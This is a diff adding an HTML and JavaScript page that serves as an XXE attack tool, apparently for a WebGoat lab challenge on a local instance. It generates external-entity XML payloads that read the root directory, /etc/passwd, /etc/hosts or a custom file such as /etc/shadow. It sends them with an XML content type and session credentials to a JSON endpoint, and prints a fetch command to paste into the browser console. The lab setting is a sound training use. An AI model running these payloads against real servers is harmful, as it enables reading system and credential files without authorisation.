@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XXE - Modern REST Framework Attack</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 1000px;
+            margin: 30px auto;
+            padding: 30px;
+            background: linear-gradient(135deg, #ff6b6b 0%, #c92a2a 100%);
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #c92a2a;
+            margin-top: 0;
+            border-bottom: 3px solid #ff6b6b;
+            padding-bottom: 15px;
+        }
+        .alert {
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info { background: #e3f2fd; border-color: #2196F3; color: #0d47a1; }
+        .alert-success { background: #e8f5e9; border-color: #4caf50; color: #1b5e20; }
+        .alert-warning { background: #fff3cd; border-color: #ff9800; color: #e65100; }
+        .section {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 4px solid #ff6b6b;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin: 15px 0 5px 0;
+            color: #333;
+        }
+        input[type="text"], select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: monospace;
+            box-sizing: border-box;
+        }
+        textarea {
+            min-height: 120px;
+            font-family: 'Courier New', monospace;
+        }
+        button {
+            background: linear-gradient(135deg, #ff6b6b 0%, #c92a2a 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 5px 10px 0;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 107, 107, 0.4);
+        }
+        button.secondary {
+            background: linear-gradient(135deg, #757575 0%, #424242 100%);
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+        #response {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 XXE - Modern REST Framework</h1>
+        
+        <div class="alert alert-warning">
+            <strong>⚠️ Challenge:</strong> Exploit XXE on a JSON API that also accepts XML!
+        </div>
+
+        <div class="alert alert-info">
+            <strong>📝 Key Insight:</strong><br>
+            Modern REST frameworks (Spring Boot, JAX-RS) can accept multiple content types.
+            Even if an endpoint expects JSON, it might also parse XML if you set:<br>
+            <code>Content-Type: application/xml</code>
+        </div>
+
+        <div class="section">
+            <h3>🔍 Step 1: Find the Endpoint</h3>
+            <p>First, submit a normal comment and check the Network tab to find the endpoint.</p>
+            <p>Common endpoints:</p>
+            <ul>
+                <li><code>/WebGoat/xxe/content-type</code></li>
+                <li><code>/WebGoat/xxe/comments</code></li>
+                <li><code>/WebGoat/xxe/rest</code></li>
+            </ul>
+            
+            <label>WebGoat URL:</label>
+            <input type="text" id="baseUrl" value="http://192.168.254.112:8001" />
+            
+            <label>XXE Endpoint:</label>
+            <input type="text" id="endpoint" value="/WebGoat/xxe/content-type" placeholder="e.g., /WebGoat/xxe/content-type" />
+        </div>
+
+        <div class="section">
+            <h3>⚙️ Step 2: Choose Payload</h3>
+            
+            <label>Attack Target:</label>
+            <select id="payloadType" onchange="updatePayload()">
+                <option value="root">List Root Directory (/)</option>
+                <option value="passwd">Read /etc/passwd</option>
+                <option value="hosts">Read /etc/hosts</option>
+                <option value="custom">Custom File</option>
+            </select>
+            
+            <div id="customPath" style="display:none; margin-top: 10px;">
+                <label>Custom File Path:</label>
+                <input type="text" id="customFile" placeholder="e.g., /etc/shadow" />
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>📦 Step 3: XXE Payload</h3>
+            
+            <label>XML Payload:</label>
+            <textarea id="payload"></textarea>
+            
+            <button onclick="copyPayload()" class="secondary">📋 Copy</button>
+            <button onclick="generateFetchCommand()" class="secondary">📖 Show Fetch Command</button>
+        </div>
+
+        <div class="section">
+            <h3>🚀 Step 4: Execute Attack</h3>
+            
+            <p><strong>Important:</strong> Notice we're using <code>Content-Type: application/xml</code> instead of JSON!</p>
+            
+            <button onclick="executeXXE()">🔥 Send XXE Attack</button>
+        </div>
+
+        <div id="response"></div>
+
+        <div id="fetchCommand" style="display:none;" class="alert alert-info">
+            <h4>💻 Use this in Browser Console:</h4>
+            <pre id="fetchCode"></pre>
+            <button onclick="copyFetch()" class="secondary">📋 Copy Command</button>
+        </div>
+    </div>
+
+    <script>
+        const payloads = {
+            root: 'file:///',
+            passwd: 'file:///etc/passwd',
+            hosts: 'file:///etc/hosts'
+        };
+
+        function updatePayload() {
+            const type = document.getElementById('payloadType').value;
+            const customDiv = document.getElementById('customPath');
+            
+            if (type === 'custom') {
+                customDiv.style.display = 'block';
+            } else {
+                customDiv.style.display = 'none';
+                generatePayload(payloads[type]);
+            }
+        }
+
+        function generatePayload(filePath) {
+            const payload = `<!DOCTYPE comment [<!ENTITY xxe SYSTEM "${filePath}">]><comment><text>&xxe;</text></comment>`;
+            document.getElementById('payload').value = payload;
+        }
+
+        function copyPayload() {
+            const payload = document.getElementById('payload').value;
+            navigator.clipboard.writeText(payload).then(() => {
+                alert('✅ Payload copied!');
+            });
+        }
+
+        function generateFetchCommand() {
+            const baseUrl = document.getElementById('baseUrl').value.trim();
+            const endpoint = document.getElementById('endpoint').value.trim();
+            const payload = document.getElementById('payload').value;
+            
+            if (!baseUrl || !endpoint) {
+                alert('Please fill in URL and endpoint!');
+                return;
+            }
+
+            const fullUrl = baseUrl + endpoint;
+            const fetchCmd = `fetch("${fullUrl}", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/xml"
+  },
+  body: '${payload.replace(/'/g, "\\'")}'
+}).then(r => r.text()).then(console.log);`;
+
+            document.getElementById('fetchCode').textContent = fetchCmd;
+            document.getElementById('fetchCommand').style.display = 'block';
+        }
+
+        function copyFetch() {
+            const cmd = document.getElementById('fetchCode').textContent;
+            navigator.clipboard.writeText(cmd).then(() => {
+                alert('✅ Fetch command copied! Paste in browser console.');
+            });
+        }
+
+        async function executeXXE() {
+            const baseUrl = document.getElementById('baseUrl').value.trim();
+            const endpoint = document.getElementById('endpoint').value.trim();
+            let payload = document.getElementById('payload').value;
+            
+            if (!baseUrl || !endpoint) {
+                alert('Please fill in URL and endpoint!');
+                return;
+            }
+
+            // Check for custom path
+            const payloadType = document.getElementById('payloadType').value;
+            if (payloadType === 'custom') {
+                const customFile = document.getElementById('customFile').value.trim();
+                if (!customFile) {
+                    alert('Please enter a custom file path!');
+                    return;
+                }
+                let filePath = customFile;
+                if (!filePath.startsWith('file://')) {
+                    filePath = 'file://' + filePath;
+                }
+                generatePayload(filePath);
+                payload = document.getElementById('payload').value;
+            }
+
+            const fullUrl = baseUrl + endpoint;
+            const responseDiv = document.getElementById('response');
+            
+            responseDiv.style.display = 'block';
+            responseDiv.innerHTML = `
+                <div style="color: #ff9800;">
+                    <strong>🔄 Sending XXE attack...</strong><br>
+                    URL: ${fullUrl}<br>
+                    Content-Type: <strong>application/xml</strong><br>
+                    <small>If CORS blocks this, use the Browser Console method.</small>
+                </div>
+            `;
+
+            try {
+                const response = await fetch(fullUrl, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/xml'
+                    },
+                    body: payload
+                });
+
+                const text = await response.text();
+                
+                responseDiv.innerHTML = `
+                    <div style="background: #e8f5e9; padding: 15px; border-radius: 5px; border-left: 4px solid #4caf50;">
+                        <h3 style="color: #1b5e20; margin-top: 0;">✅ Response Received!</h3>
+                        <p><strong>Status:</strong> ${response.status} ${response.statusText}</p>
+                        <p><strong>Content-Type sent:</strong> <code>application/xml</code></p>
+                        <p><strong>Response:</strong></p>
+                        <pre style="background: #fff; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;">${escapeHtml(text)}</pre>
+                        <hr>
+                        <p><strong>Next Steps:</strong></p>
+                        <ul>
+                            <li>Check if response contains file/directory listing</li>
+                            <li>Verify lesson is complete in WebGoat</li>
+                            <li>Try different payloads if needed</li>
+                        </ul>
+                    </div>
+                `;
+
+                console.log('XXE Response:', text);
+
+            } catch (error) {
+                responseDiv.innerHTML = `
+                    <div style="background: #ffebee; padding: 15px; border-radius: 5px; border-left: 4px solid #f44336;">
+                        <h3 style="color: #b71c1c; margin-top: 0;">❌ Request Failed</h3>
+                        <p><strong>Error:</strong> ${error.message}</p>
+                        <p><strong>Likely CORS restriction.</strong></p>
+                        <hr>
+                        <p><strong>Use Browser Console Method:</strong></p>
+                        <ol>
+                            <li>Click "📖 Show Fetch Command" above</li>
+                            <li>Copy the command</li>
+                            <li>Open Console (F12)</li>
+                            <li>Paste and press Enter</li>
+                        </ol>
+                    </div>
+                `;
+
+                console.error('XXE Error:', error);
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Initialize
+        window.onload = function() {
+            updatePayload();
+            console.log('XXE Modern REST Framework Tool Loaded');
+            console.log('Key: Use Content-Type: application/xml on JSON endpoints!');
+        };
+    </script>
+</body>
+</html>
